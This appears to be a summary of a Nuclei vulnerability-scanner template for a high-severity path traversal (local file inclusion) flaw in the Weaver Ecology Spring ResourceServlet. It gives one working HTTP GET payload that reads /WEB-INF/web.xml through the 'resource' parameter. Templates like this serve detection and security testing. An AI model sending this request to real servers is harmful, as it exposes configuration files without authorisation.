# Nuclei Template: Ecology Springframework - Local File Inclusion
**Template ID:** ecology-springframework-directory-traversal
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`ecology-springframework-directory-traversal.yaml`)

## Vulnerability Information & PoC

## Description
Ecology Springframework is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
```

